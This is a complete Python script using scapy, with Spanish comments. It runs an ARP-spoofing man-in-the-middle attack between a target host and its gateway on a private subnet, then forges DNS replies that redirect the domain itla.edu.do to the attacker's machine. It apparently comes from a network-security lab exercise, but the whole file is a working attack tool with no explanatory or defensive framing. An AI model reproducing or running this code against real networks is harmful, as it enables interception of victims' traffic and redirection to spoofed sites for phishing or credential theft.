#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import subprocess
# pyrefly: ignore [missing-import]
from scapy.all import *

class DnsHijackEngine:
    def __init__(self):
        # Parámetros de red
        self.iface = "eth0"
        self.host_ip = "192.168.21.11"
        self.target_host = "192.168.21.17"
        self.router_ip = "192.168.21.1"
        
        # Dominio a interceptar
        self.hijack_domain = "itla.edu.do"
        
        # Caché de direcciones MAC
        self.mac_cache = {}
        
    def enable_routing(self):
        """Habilita el forwarding de paquetes en el kernel Linux."""
        print("[*] Configurando reenvío de paquetes...")
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"], 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
        
    def resolve_hardware_addr(self, ip_addr):
        """Resuelve dirección MAC mediante ARP broadcast."""
        if ip_addr in self.mac_cache:
            return self.mac_cache[ip_addr]
            
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr)
        # pyrefly: ignore [name-defined]
        resp, _ = srp(pkt, timeout=3, iface=self.iface, verbose=0)
        
        if resp:
            mac = resp[0][1].src
            self.mac_cache[ip_addr] = mac
            return mac
        return None
        
    def arp_manipulation(self):
        """Mantiene envenenamiento ARP en segundo plano."""
        tgt_mac = self.resolve_hardware_addr(self.target_host)
        gw_mac = self.resolve_hardware_addr(self.router_ip)
        
        if not tgt_mac or not gw_mac:
            print("[!] Fallo al obtener direcciones MAC. Abortando.")
            sys.exit(1)
            
        print(f"[*] ARP spoofing activo: {self.target_host} <-> {self.router_ip}")
        
        while True:
            # Paquete para la víctima (fingiendo ser el gateway)
            victim_pkt = ARP(
                op=2, 
                pdst=self.target_host, 
                hwdst=tgt_mac, 
                psrc=self.router_ip
            )
            
            # Paquete para el gateway (fingiendo ser la víctima)
            gateway_pkt = ARP(
                op=2, 
                pdst=self.router_ip, 
                hwdst=gw_mac, 
                psrc=self.target_host
            )
            
            send(victim_pkt, verbose=0)
            send(gateway_pkt, verbose=0)
            time.sleep(2.5)
            
    def craft_fake_response(self, original_pkt, query_name):
        """Construye respuesta DNS falsificada."""
        ip_layer = IP(dst=original_pkt[IP].src, src=original_pkt[IP].dst)
        udp_layer = UDP(
            dport=original_pkt[UDP].sport, 
            sport=original_pkt[UDP].dport
        )
        dns_layer = DNS(
            id=original_pkt[DNS].id,
            qr=1,
            aa=1,
            qd=original_pkt[DNS].qd,
            an=DNSRR(rrname=query_name, ttl=300, rdata=self.host_ip)
        )
        
        return ip_layer / udp_layer / dns_layer
        
    def packet_callback(self, pkt):
        """Procesa paquetes DNS capturados."""
        if not pkt.haslayer(DNS):
            return
            
        dns_segment = pkt.getlayer(DNS)
        
        # qr=0 indica consulta, qr=1 indica respuesta
        if dns_segment.qr != 0:
            return
            
        try:
            domain = dns_segment.qd.qname.decode().rstrip('.')
            
            if self.hijack_domain in domain:
                print(f"[!] Interceptado: {domain} -> Redirigiendo a {self.host_ip}")
                
                fake_pkt = self.craft_fake_response(pkt, dns_segment.qd.qname)
                # Envío múltiple para ganar carrera contra servidor legítimo
                send(fake_pkt, iface=self.iface, verbose=0, count=3)
                
        except Exception:
            # Ignorar paquetes malformados
            pass
            
    def start(self):
        """Punto de entrada principal."""
        if os.geteuid() != 0:
            print("[!] Se requieren privilegios de administrador (sudo)")
            sys.exit(1)
            
        self.enable_routing()
        
        # Hilo daemon para ARP spoofing
        arp_thread = threading.Thread(target=self.arp_manipulation, daemon=True)
        arp_thread.start()
        
        print(f"[*] Escuchando consultas DNS para *.{self.hijack_domain}...")
        print("[*] Presiona Ctrl+C para detener")
        
        try:
            sniff(
                iface=self.iface,
                filter="udp and port 53",
                prn=self.packet_callback,
                store=False
            )
        except KeyboardInterrupt:
            print("\n[+] Finalizando ataque...")
            sys.exit(0)


if __name__ == "__main__":
    engine = DnsHijackEngine()
    engine.start()